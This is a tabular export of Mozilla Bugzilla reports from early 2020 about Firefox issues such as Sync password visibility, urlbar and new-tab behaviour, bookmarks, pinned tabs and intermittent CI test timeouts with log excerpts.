1611440,Passwords still visible after loss of sync,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Started Firefox on a machine which had previously been signed in to Firefox Sync. It has now updated Firefox on that machine (to 72.0.2, unsure of previous version). Clicked on the account/person icon and saw ""Sign in to Firefox, Turn on Sync"", so my account wasn't sync'd on this machine. Actual results: When I went to a website, it offered to autofill my password. On checking the ""Logins and Passwords"" page, all my passwords are still visible. Expected results: No passwords should be visible."
1611443,v2 personaliztion console error,RESOLVED,--,FIXED,"Saw this error this morning while testing it preffed on in nightly: TypeError: nbTagger.tagTokens is not a function RecipeExecutor.jsm:146:29 I believe it's an issue with loading from cache, which I think the issue starts here: https://searchfox.org/mozilla-central/source/browser/components/newtab/lib/PersonalityProvider.jsm#108 I don't know if we want to do more validation on the data before using it, or if we can clean up the data we cache. The old AS v2 didn't use this cache, and now I see why. I think it only works as in memory cache, and not persistent cache. So probably best to just not use this item as cache as using it as in memory cache has very little performance gains. I think this time though a comment as to why we cannot cache this would help hitting this again in the future."
1611453,Intermittent MemoryError: out of memory,RESOLVED,P5,INCOMPLETE,"**Filed by:** ncsoregi [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=286341871&repo=mozilla-central **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/c6tTk7dxTXa3sahzujEeJA/runs/0/artifacts/public/logs/live_backing.log --- >[task 2020-01-24T14:06:24.342Z] 14:06:24 INFO - TEST-START | /offscreen-canvas/fill-and-stroke-styles/2d.gradient.radial.transform.1.worker.html [task 2020-01-24T14:06:24.351Z] 14:06:24 INFO - Closing window 713 [task 2020-01-24T14:06:24.422Z] 14:06:24 INFO - PID 2920 | ###!!! [Parent][RunMessage] Error: Channel closing: too late to send/recv, messages will be lost [task 2020-01-24T14:06:24.427Z] 14:06:24 INFO - PID 2920 | ###!!! [Parent][RunMessage] Error: Channel closing: too late to send/recv, messages will be lost [task 2020-01-24T14:06:24.997Z] 14:06:24 INFO - PID 2920 | JavaScript error: , line 0: uncaught exception: out of memory [task 2020-01-24T14:06:25.022Z] 14:06:25 INFO - PID 2920 | JavaScript error: , line 0: uncaught exception: out of memory [task 2020-01-24T14:06:29.436Z] 14:06:29 INFO - PID 2920 | A content process crashed and MOZ_CRASHREPORTER_SHUTDOWN is set, shutting down [task "
1611469,backgroundPageThumbsContent.js mixes nsIRequest and nsIWebNavigation load flags,RESOLVED,--,FIXED,"See https://searchfox.org/mozilla-central/rev/d48b18fa27315206bf68d4dac82bc4e27a3f138e/toolkit/components/thumbnails/content/backgroundPageThumbsContent.js#48-52. This bitfield is being assigned to the docShell's `defaultLoadFlags`, which should be comprised of `nsIRequest` load flag bits. The `nsIWebNavigation` bit that is OR'd in has a value of 0x0040 which happens to be an undefined bit in `nsIRequest`, so for now I guess it's benign, but this is not enforced anywhere as far as I can tell. I didn't actually check whether this bit is actually respected as intended by this script by consumers of `defaultLoadFlags`, but it seems like a fair assumption. Mark and Drew, hg blame suggests that you might understand the intention of this code? Can you help here? :)"
1611507,"JavaScript error: resource://gre/actors/PictureInPictureChild.jsm, line 414: TypeError: can't access property ""disarm"", state.mousemoveDeferredTask is null",RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Steps to reproduce: Navigating between sites, twitter and news sites Actual results: Error: ```JavaScript error: resource://gre/actors/PictureInPictureChild.jsm, line 414: TypeError: can't access property ""disarm"", state.mousemoveDeferredTask is null ``` Expected results: No errors. Thanks!"
1611514,New-tab pocket recommendation thumbnails have visual artifacts introduced by our PNG-->JPEG post-processing,NEW,P3,,"It seems the Pocket-powered recommendations on the New Tab Page are taking PNG images, downscaling & reencoding them as JPEG images, and using that lossy/visual-artifact-laden result for the thumbnail. For photos this may be fine, but for simpler graphics, it looks pretty gross. See attached screenshot, which shows weird ""halo""/""ghost"" JPEG artifacts in a thumbnail for a simplisafe sponsored article. If I right-click the image to get its URL, I can see that it is the following (which also shows the artifacts if I load it directly): https://img-getpocket.cdn.mozilla.net/296x148/filters:format(jpeg):quality(60):no_upscale():strip_exif()/https%3A%2F%2Fs.zkcdn.net%2FAdvertisers%2F1d95cdbde5a74b448a6c7525cd7341ec.png If I snip out and url-decode the last ~third of that URL, I can get the source image which is: https://s.zkcdn.net/Advertisers/1d95cdbde5a74b448a6c7525cd7341ec.png ...which does not have any such artifacts."
1611516,Struggling to remove pocket item from the address bar when using user.js,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0 Steps to reproduce: This issue is related with #1498914 (the Pocket icon removal does not persist accross reboots) and also the three dots menu in the title bar. Pocket icon in the address bar: 1. Open Firefox. 2. Remove Pocket icon from address bar. 3. Restart Firefox. 4. Pocket icon is again in the address bar. I have tried to modify `browser.pageActions.persistedActions` (both in `about:config` and in `user.js`), the result is same, or even worse: `Add search Engine` is added to the three dots menu (which was not there before playing with the setting). Also, there is not GUI way to _remove_ items from the three dots menu (I think it would be nice to add this option to the right-click menu, where there is only _Add to Address Bar_ option). Just a note: I have enabled Firefox sync. Actual results: All (let’s say) default address bar items and the three-dot menu items are displayed and the `browser.pageActions.persistedActions` setting is reset. Sometimes even `Add search Engine` was added to the list. Expected results: Only those address bar items and the three-dot menu items should be displayed, whic"
1611517,DOS via insecure form submission prompt,RESOLVED,--,DUPLICATE,User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: The first time I've proceed with a reboot. The second time it corrupt Firefox and I need to reinstall my browser.
1611539,Intermittent browser/base/content/test/siteIdentity/browser_secure_transport_insecure_scheme.js | Test timed out -,RESOLVED,P5,INCOMPLETE,**Filed by:** opoprus [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=286409755&repo=mozilla-beta **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/ebXZXoKeRlq3KoUCCUefmQ/runs/0/artifacts/public/logs/live_backing.log --- [task 2020-01-24T20:04:07.882Z] 20:04:07 INFO - TEST-START | browser/base/content/test/siteIdentity/browser_secure_transport_insecure_scheme.js [task 2020-01-24T20:04:07.892Z] 20:04:07 INFO - GECKO(2296) | [Child 7792: Main Thread]: I/DocShellAndDOMWindowLeak ++DOCSHELL 00000178D7649800 == 1 [pid = 7792] [id = {b8cc1526-d93c-4dfc-80f9-63c1c3c86659}] [task 2020-01-24T20:04:07.892Z] 20:04:07 INFO - GECKO(2296) | [Child 7792: Main Thread]: I/DocShellAndDOMWindowLeak ++DOMWINDOW == 12 (00000178DD5347A0) [pid = 7792] [serial = 185] [outer = 0000000000000000] [task 2020-01-24T20:04:07.892Z] 20:04:07 INFO - GECKO(2296) | [Child 7792: Main Thread]: I/DocShellAndDOMWindowLeak ++DOMWINDOW == 13 (00000178D76D2C00) [pid = 7792] [serial = 186] [outer = 00000178DD5347A0] [task 2020-01-24T20:04:07.991Z] 20:04:07 INFO - GECKO(2296) | [Child 7792: Main Thread]: I/DocShellAndDOMWindowLeak ++DOMWINDOW == 14 (00000178DD96
1611553,Long-click on New Tab button doesn't give the option to open a tab in a container,RESOLVED,--,INVALID,"A couple of days ago I was able to open a tab in a different container with a long click on the new tab ""+"" button on the tab bar. This doesn't work today. Tried in my normal profile and in Safe Mode. Using Nightly on Linux. Steps to reproduce: 1. Click and hold on the new tab ""+"" in the tab bar. Expected result: 1. A menu with a list of containers pops up. Actual result: 1. Firefox waits for the click to end and opens a new tab."
1611557,Intermittent TEST-UNEXPECTED-TIMEOUT | browser/modules/test/browser/browser_TabUnloader.js | application timed out after 370 seconds with no output,RESOLVED,P5,INCOMPLETE,"**Filed by:** nbeleuzu [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=286421217&repo=mozilla-central **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/Xy3FLO1iTUKEHApnfA9Ubw/runs/0/artifacts/public/logs/live_backing.log --- [task 2020-01-24T22:32:04.219Z] 22:32:04 INFO - TEST-PASS | browser/modules/test/browser/browser_TabUnloader.js | unloaded a pinned tab playing sound - [task 2020-01-24T22:32:04.219Z] 22:32:04 INFO - Console message: [JavaScript Error: ""TypeError: can't access property ""disarm"", state.mousemoveDeferredTask is null"" {file: ""resource://gre/actors/PictureInPictureChild.jsm"" line: 414}] [task 2020-01-24T22:32:04.220Z] 22:32:04 INFO - Console message: [JavaScript Error: ""TypeError: can't access property ""disarm"", state.mousemoveDeferredTask is null"" {file: ""resource://gre/actors/PictureInPictureChild.jsm"" line: 414}] [task 2020-01-24T22:32:04.220Z] 22:32:04 INFO - Buffered messages logged at 22:25:54 [task 2020-01-24T22:32:04.220Z] 22:32:04 INFO - TEST-PASS | browser/modules/test/browser/browser_TabUnloader.js | low-memory memory-pressure notification unloaded the LRU tab - [task 2020-01-24T22:32:04.220"
1611558,Intermittent browser/extensions/doh-rollout/test/browser/browser_doorhanger_newProfile.js | Uncaught exception - undefined - timed out after 50 tries.,RESOLVED,P5,INCOMPLETE,**Filed by:** nbeleuzu [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=286421040&repo=mozilla-central **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/DHLsiqksRpqGpxPXyKma4Q/runs/0/artifacts/public/logs/live_backing.log **Reftest URL:** https://hg.mozilla.org/mozilla-central/raw-file/tip/layout/tools/reftest/reftest-analyzer.xhtml#logurl=https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/DHLsiqksRpqGpxPXyKma4Q/runs/0/artifacts/public/logs/live_backing.log&only_show_unexpected=1 --- [task 2020-01-24T23:01:40.679Z] 23:01:40 INFO - TEST-START | browser/extensions/doh-rollout/test/browser/browser_doorhanger_newProfile.js [task 2020-01-24T23:01:45.802Z] 23:01:45 INFO - TEST-INFO | started process screentopng [task 2020-01-24T23:01:46.086Z] 23:01:46 INFO - TEST-INFO | screentopng: exit 0 [task 2020-01-24T23:01:46.086Z] 23:01:46 INFO - Buffered messages logged at 23:01:40 [task 2020-01-24T23:01:46.087Z] 23:01:46 INFO - Entering test bound setup [task 2020-01-24T23:01:46.087Z] 23:01:46 INFO - Leaving test bound setup [task 2020-01-24T23:01:46.088Z] 23:01:46 INFO - Entering test bound testDoorhanger [task 2020-01-24T
1611559,"Cross-site and social trackers show up as ""Allowed"" in the Protections Panel with DFPI",RESOLVED,P3,DUPLICATE,STR: 1. Set `network.cookie.cookieBehavior` to 5. 2. Navigate to https://www.theatlantic.com/science/archive/2020/01/betelgeuse-supernova/605251/. 3. Open the Protections Panel. Social media and cross-site trackers show up as Allowed instead of Blocked. This may confuse people who are testing DFPI and make them believe cookie blocking isn't working correctly...
1611573,bookmark,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: after i logged on my work laptop and checked my firefox for some reason it uploads my old bookmarks and messed up with my newer bookmarks to cloud and wont undo it... Actual results: i tried to load my bookmark backup file and it keeps adding the old bookmark back... no matter what i try to ""sync"" it wont upload backed up file to the cloud :( Expected results: it should save the current bookmarks from my home computer like i wanted... not saving the old bookmark from 4 to 7 months ago like from the backed up file and reset the cloud data to that file..."
1611587,Bookmarks with no title might be reordered.,UNCONFIRMED,P3,,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Each time Firefox Sync syncs my data, all the bookmarks in my Bookmarks Toolbar, which are within separate folders, get mixed up. Actual results: All bookmarks in separate folders are all in ONE folder, the other folders then are empty + the position of the folders are mixed up as well. Expected results: No rearrangement of the bookmark folders an the bookmarks within the folders in the Bookmarks Toolbar."
1611592,Firefox becomes unresponsive when deleting bookmarks,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: 1. Open ""Show All Bookmarks"". 2. Select almost 4000 bookmarks (all my bookmarks in ""Other Bookmarks"" folder). 3. Press Delete. Actual results: Deleting takes a long time and after some time ""Warning: Unresponsive script"" message appears. While deleting bookmarks whole browser becomes unresponsive. Expected results: Deleting bookmarks should not freeze browser. Deletion process should run in background. And it would be good user experience to show that bookmarks are actually being deleted."
1611598,Unable to change the start page to custom url if blank page is set via policy,RESOLVED,P3,DUPLICATE,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Set the start page via Policy (tested with GPO) to blank page. Start Firefox and change start page from blank to custom URL. Restart Firefox. Actual results: Firefox starts with blank page. Expected results: Firefox should start with custom URL.
1611600,browser.launcherProcess.enabled gets reset to true on Firefox update,RESOLVED,--,WONTFIX,"If browser.launcherProcess.enabled is set to false, it'll be reset to true after a Firefox update. Reproduced on a new profile by installing Firefox 71, setting browser.launcherProcess.enabled to false, then letting Firefox update."
1611605,Tabs did not get restored from previous session,NEW,P3,,"User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 OPR/64.0.3417.92 Steps to reproduce: Had several tabs open. Browser window open all night (8+ hours). Restore previous session is set to on in preferences. output of uname -a Linux brittney-HP-Notebook 4.15.0-74-generic #84-Ubuntu SMP Thu Dec 19 08:06:28 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux Actual results: Woke up to find Firefox had closed. Restarted Firefox and it opened to start page https://start.ubuntu-mate.org/ No tabs were restored. Under History -> Recently closed tabs contains no info Expected results: Tabs from previously session should have been remembered and restored"
1611611,Important News page always comes up when Firefox starts,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Start Firefox Actual results: ""Important News"" tab opens up all the time and I don't want to see it anymore Expected results: I want my own start page to come up"
1611641,[regression] Opening a new tab should not override PRIMARY paste content,RESOLVED,P5,WORKSFORME,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Steps to reproduce: On a Linux system, select some short text. Open a new tab. Middle-click on empty URL-bar. Actual results: The current URL of the previous focused tab is pasted. Expected results: The short text you had selected should be pasted."
1611644,UrlBar: update search suggestions after re-opening the urlbarView,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 6.1; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Type ""Firefox"" in the UrlBar (Google). Navigate with the Arrow-Down key to ""Firefox monitor"" (so that this string is shown in the bar). Click somewhere in the page. Re-focus the UrlBar. . Actual results: The suggestions in the urlbarView are those of the previous string:""Firefox"". Expected results: Update the suggestions to the last/current string: ""Firefox monitor"". (This is the behavior in the SearchBar)."
1611645,"""Mozilla Firefox (Private Browsing)"" tooltip appears when hovering over browser chrome in private windows, for example over urlbar search suggestions",VERIFIED,P3,FIXED,"User Agent: Mozilla/5.0 (Windows NT 6.1; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Open a private window. Type ""Firefox"" in the UrlBar. Hover over the search suggestions. Actual results: A ""Mozilla Firefox (Private Browsing)"" tooltip shows up. Expected results: This tooltip is distracting. Do not show it."
1611649,"[regression] Middle-clicking in URL-bar should only paste PRIMARY buffer, even if clickSelectsAll is True",RESOLVED,P5,WORKSFORME,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Steps to reproduce: On a Linux system, ensure your `browser.urlbar.clickSelectsAll` option is set to True. Select some short text. Middle-click in your URL-bar. Actual results: The full current URL is pasted where you have clicked. I.e., if you were on `http://example.url/my-page` an you have middle-clicked just after the last slash /, the new URL is now `http://example.url/http://example.url/my-pagemy-page` Expected results: The selected short text should be pasted where you have middle-clicked (as Firefox do when `browser.urlbar.clickSelectsAll` option is set to False). Alternatively, the selected text could replace the current URL-bar content."
1611664,Context Menu Bug,RESOLVED,--,INVALID,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: **dom.event.contextmenu.enabled** is set to `true` by the way. Right Click inside YT video to randomly get FF's native context menu inside of the intended one from YT's end. Actual results: Youtube's context menu is replaced by FF's native menu. Expected results: Youtube's context menu should be shown at all times.
1611673,Nightly Regular sized search bar on new tab even when Compact mode is enabled.,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0 Steps to reproduce: OS: Windows 10 64-bit Nightly version: 74.0a1 (2020-01-25) (64-bit) Theme: Dark, Compact Installed nightly as normal. Changed theme to Dark and got rid of all Firefox Home content. Switched from Normal to Compact. Actual results: When opening a new tab (Firefox Home), Firefox uses the regular sized search bar even when in Compact mode. I tried switching themes, I've tried switching from Compact, to Regular, to Tablet, all with no effect. Typing ""about:newtab"" directly into the search bar temporarily fixes the issue, but doesn't hold over when opening new tabs. Also, clicking out of the window puts the search bar back to the Compact size, but again, this doesn't carry over into new tabs. Expected results: The Compact sized search bar should appear when opening a new tab in Compact mode, but is instead the larger regular sized search bar."
1611680,white screen after signing into fandango.com on macOS Sierra,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Safari/605.1.15 Steps to reproduce: I brought up fandango.com. I was not logged into to my fandangoVIP account. I then did so and the screen went completely white. See the indicative attached screen shot. Actual results: The screen went completely white. After encountering this, I cleared the cache and cookies for fandango.com several times and restarted the browser several times, trying safe mode as well as disabling any hardware acceleration. I first encountered this on Firefox 72, then tried Firefox 71. After clearing cookies, I can see fandango.com, but it goes white after I enter my username and password. Expected results: I should have been able to see the web site. I logged into their companion fandango now.com website so you can see more what I was expecting. On that site I am not encountering a problem."
1611685,Closing the main window removes pinned tabs,RESOLVED,--,DUPLICATE,1. Pin some tabs 2. Open a new window 3. Close the window with pinned tabs first 4. Close all remaining windows 5. Open a new one Expected: The pinned tabs should reappear Actual: No pinned tabs
1611689,Text in Search Bar are deleted after exit DOM FullScreen,VERIFIED,P1,FIXED,Reproducible: always Steps to reproduce: 1. Enable Search Bar 2. Type something in the Search Bar 3. Open any video 4. Enter DOM FullScreen and exit DOM FullScreen Actual Results: Text in Search Bar are deleted Expected Results: The text should be retained Regression window: https://hg.mozilla.org/integration/autoland/pushloghtml?fromchange=ac5fc1e491a2bb5481d47247bea3c2b22318001c&tochange=517c9efa9592ad0c103ec2542e4bc7fcaf06c505
1611690,Send tab to device not triggering master password anymore and not sending tabs,VERIFIED,P1,FIXED,"### Prerequisite Firefox with - master password set - sync enabled - other devices syncing as well to have a list of at least one device to send to - Add ""Send Tab to Device"" to address bar (via ""..."" in address bar) to show icon (_that's just how I set it up really_) ### Steps - restart Firefox - in case a master password prompt comes up, close it for now (e.g. hit `esc`) - trigger ""send tab"" from address bar icon ### Expected The master password comes up to enable the tab syncing. ### Actual Several weeks ago this behaviour stopped. Now the device list comes up directly and can be clicked, but the tab does not get sent. ### Work around The master password has to be trigger differently* and filled in first, before tabs can be sent. *for example: Toolbar > Firefox Account icon > ""Sync now"""
1611702,Firefox allows malicious redirects which are blocked in Chrome,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Follow the link (in google) https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=7&ved=2ahUKEwjSvePzzaHnAhUKiYsKHYauC_8QFjAGegQIChAB&url=https%3A%2F%2Finneka.com%2Fprogramming%2Fpython%2Fopencv-python-draw-minarearect-rotatedrect-not-implemented%2F&usg=AOvVaw13mut4ifdINMpjBEeNkhXW there redirecting on a search result. Firefox writes that a popup is blocked, but in fact they open! Actual results: Opens pop-up in other tab with spam in google, yandex search Expected results: BLOCK THIS POP-UP! In Chromium currently that's is works. In Firefox - don't works."
1611709,Applications for file extensions associated with application/force-download are hosed,RESOLVED,--,DUPLICATE,"FF 72.0.2 64-bit This is simple to see, but difficult to explain. On my machine, in the Tools -> Options -> Files and Applications pane, TAR file and Text document appear next to each other in the list. This is important to remember when reproducing. STEPS TO REPRODUCE: 1. Open Tools -> Options -> Files and Applications and set two adjacent MIME/file/content types to ""Always Ask,"" and close the Options window. 2. Download a file with the MIME type of the second type changed in Step #1 so that you receive the standard dialog asking you what to do with the file. 3. Select an application and check the ""Do this automatically for files like this from now on"" checkbox. 4. Press ""OK."" 5. Open Tools -> Options -> Files and Applications. RESULT The default action for the adjacent file type is changed. EXPECTED The default action for the file type that triggered the dialog is changed. EXAMPLE On my machine I have ""TAR file"" and ""Text document"" appearing in that order. If the default action for ""Text document"" is ""Always ask"" I will receive the download dialog every time I download a file with text/plain content-type. If I tell Firefox to use Notepad to open files of this type and make that t"
1611715,Arrow in download button is not centered horizontally,VERIFIED,--,FIXED,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0 Steps to reproduce: Take a screenshot by ""Save full page"" or ""Save visible"". Actual results: The UI looks not proper."
1611740,Using a data url for downloading a CSV document loses row line endings.,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: 1. Generate an io.StringIO() object as a CSV file in Python 2. Add a link to a webpage with a link having the above string as the data part of a data url (<a href=""data:text/csv;charset=utf-8,[[the string]]"" download=""filename.csv"">etc. 3. Deploy the webpage and click the link Actual results: The file is downloaded as expected. But all the line endings are missing, so all the rows are glommed together as one very wide row. Expected results: The rows of the downloaded CSV file should have been preserved as separate rows. I have experimented with many permutations of CSV quoting and line-ending styles, and have found no combination that works with Firefox. The code does generate a valid CSV file (using separate testing code to print the string to a file.) I think it's a Firefox bug because the same web page works correctly with Google Chrome. However, I don't see others reporting this issue anywhere. It's a misunderstanding on my part, I claim it's a documentation problem! URL for seeing the error: https://transfer-app.qc.cuny.edu/registered_programs/?institution=bar ..."
1611760,Issue in copy pasting url,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Steps to reproduce: When copy paste url or type url, its loading always our company internal app. Actual results: When copy paste url or type url, its loading always our company internal app. I haven't bookmarked that internal app. We dont have any security or restriction in internet. I have un install the browsers 2 - 3 times, remove all cache & history, but still facing the issue. Expected results: When copy paste url or type url, its loading always our company internal app. Expected result should be load the actual web app, according to given url."
1611762,"Checkbox ""Block new requests asking to allow notifications"" not visible",VERIFIED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 Steps to reproduce: I want to check the checkbox ""Block new requests asking to allow notifications"" as mentioned in https://support.mozilla.org/en-US/kb/push-notifications-firefox?as=u&utm_source=inproduct#w_how-do-i-stop-firefox-asking-me-to-allow-notifications Actual results: There is no such checkbox. Expected results: Checkbox should be available."
1611778,"On slower machines, the ""Firefox Home Content"" flickers when opening/reloading about:preferences#home",VERIFIED,--,FIXED,"STR: 1. Be on a somewhat slow machine 2. Open about:preferences#home -- see the ""Firefox Home Content"" section flickers 3. Reload and see the same thing ER: No flicker. I think this happens because a `margin-top: 14px;` [1] rule is injected via JS. [1] https://searchfox.org/mozilla-central/source/browser/components/newtab/lib/AboutPreferences.jsm#59-61"
1611784,Master password double prompt if about:logins page is open before closing,RESOLVED,--,DUPLICATE,"**Affected versions** * 72.0, 73.0b10, 74.0a1(2020-01-26) **Affected platforms** * Windows 10, macOS 10.13, Ubuntu 16.04; **Steps to reproduce** 1. Launch Firefox 72.0, create Master Password; 2. Login to sync & logins data; 3. Have Lockwise + options(preferences page) open; 4. Close the browser; 5. Start Firefox 73.0b10 with the same profile; **Expected result** * 1x master password prompt displayed; **Actual result** * 2x master password prompts displayed; **Regression range** * will check for it time permitting, until then updating the keywords accordingly; **Additional notes** * attached recording with the issue; * same result when opening the same version and 74.0a1; * if the logins imported are not via sync the browser loads as expected."
1611796,On MacOS Catalina Firefox Developer Edition does not load context menus correctly,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Load Firefox Developer Edition 73.0b10 Actual results: Occasionally, the top menubar in MacOS (e.g. where File, Edit, etc are) only shows the Apple Menu and ""Firefox Developer Edition"" the other menu items do not have text in the menubar. Also, context menus (right click) do not contain text as well. Expected results: The menubar should have: Firefox Developer Edition, File, View, History, etc... Context menu's should have Back, Forward, Refresh, ⭐️, Inspect Element, etc."
1611827,[Meta] animation on addons.mozilla.org,RESOLVED,--,INACTIVE,User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:72.0) Gecko/20100101 Firefox/72.0 Actual results: Addons.mozilla.org is full of migraine-inducing animation. I've posted 2 of my migraine triggers to github. https://github.com/mozilla/addons/issues/824 https://github.com/mozilla/addons/issues/593 Expected results: Addons.mozilla.org shouldn't be full of migraine-inducing animation. Cross-posting here do it's visible from bugzilla and disability access in particular.
1611845,Firefox - External URIs: Restore User-Friendly Application Names displayed from within the Launch Application Dialog,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I've only just observed this whilst running Firefox 72.0.2 - it's possible that this regression was introduced in a previous release, but up until this point I hadn't encountered the below for several weeks. To reproduce: 1. From a web page, open a URI that has been associated with an external application (a ""mailto:"" link is just one example, but any URI should do) 2. As expected, the ""Launch Application"" dialog will be triggered when the link is activated that allows the user to select which application to use to open the URI The important bit to observe here is the default entry listed under the ""Send to"" section of the dialog. In previous Firefox releases, the first application in the list would be the application associated with the URI in question - however, a ""friendly"" name would be displayed in Firefox - my assumption is that this would either be based on the filename of the target application, or the data contained within the ""Description"" field of its executable. As of Firefox 72, however, the string displayed by Firefox now displays the full path to the filename"
1611866,"backgroundPageThumbsContent.js, line 74: NS_ERROR_ILLEGAL_VALUE",RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Steps to reproduce: - When open and closing tabs - When close login form - Or login forms(New windows, redirects) Actual results: Erros: ``` JavaScript error: chrome://global/content/backgroundPageThumbsContent.js, line 74: NS_ERROR_ILLEGAL_VALUE: JavaScript error: chrome://global/content/backgroundPageThumbsContent.js, line 74: NS_ERROR_ILLEGAL_VALUE: JavaScript error: chrome://global/content/backgroundPageThumbsContent.js, line 74: NS_ERROR_ILLEGAL_VALUE: JavaScript error: chrome://global/content/backgroundPageThumbsContent.js, line 74: NS_ERROR_ILLEGAL_VALUE: JavaScript error: chrome://global/content/backgroundPageThumbsContent.js, line 74: NS_ERROR_ILLEGAL_VALUE: JavaScript error: chrome://global/content/backgroundPageThumbsContent.js, line 74: NS_ERROR_ILLEGAL_VALUE: JavaScript error: chrome://global/content/backgroundPageThumbsContent.js, line 74: NS_ERROR_ILLEGAL_VALUE: ``` Expected results: No errors. Thanks!"
1611867,"ContentMetaChild.jsm, line 167: InvalidStateError: An attempt was made to use an object that is not, or is no longer, usable",RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Steps to reproduce: - Open bugzila - Close browser - restore tabs - Close bugzilla tab Actual results: Errors: ``` JavaScript error: undefined, line 0: Error: Invalid tab ID: 142 JavaScript error: undefined, line 0: Error: Invalid tab ID: 142 JavaScript error: resource:///actors/ContentMetaChild.jsm, line 167: InvalidStateError: An attempt was made to use an object that is not, or is no longer, usable JavaScript error: resource:///actors/ContentMetaChild.jsm, line 167: InvalidStateError: An attempt was made to use an object that is not, or is no longer, usable JavaScript error: resource:///actors/ContentMetaChild.jsm, line 167: InvalidStateError: An attempt was made to use an object that is not, or is no longer, usable ``` Expected results: No errors... Thanks!"
1611870,Restoring pinned tabs sometimes leaves the tab with the right favicon but an empty url,NEW,P3,,"I've noticed this twice already over the last couple of days... The url bar is empty when I look at some of my pinned tabs, even though the favicon is right, see attached screenshot."
1611891,"Intermittent browser/components/customizableui/test/browser_editcontrols_update.js | Update when edit-controls on toolbar and focused - cut - Got false, expected true",RESOLVED,P5,INCOMPLETE,"**Filed by:** malexandru [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=286694757&repo=mozilla-central **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/NAM6yunRRjCUP2qsb8ipYg/runs/0/artifacts/public/logs/live_backing.log --- [task 2020-01-28T05:50:30.903Z] 05:50:30 INFO - TEST-PASS | browser/components/customizableui/test/browser_editcontrols_update.js | Clipboard has the given value: 'Sample' - [task 2020-01-28T05:50:30.903Z] 05:50:30 INFO - TEST-PASS | browser/components/customizableui/test/browser_editcontrols_update.js | The panel is closed to begin with. - ""closed"" == ""closed"" - [task 2020-01-28T05:50:30.904Z] 05:50:30 INFO - TEST-PASS | browser/components/customizableui/test/browser_editcontrols_update.js | The panel is open to begin with. - true == true - [task 2020-01-28T05:50:30.904Z] 05:50:30 INFO - Leaving test bound test_init [task 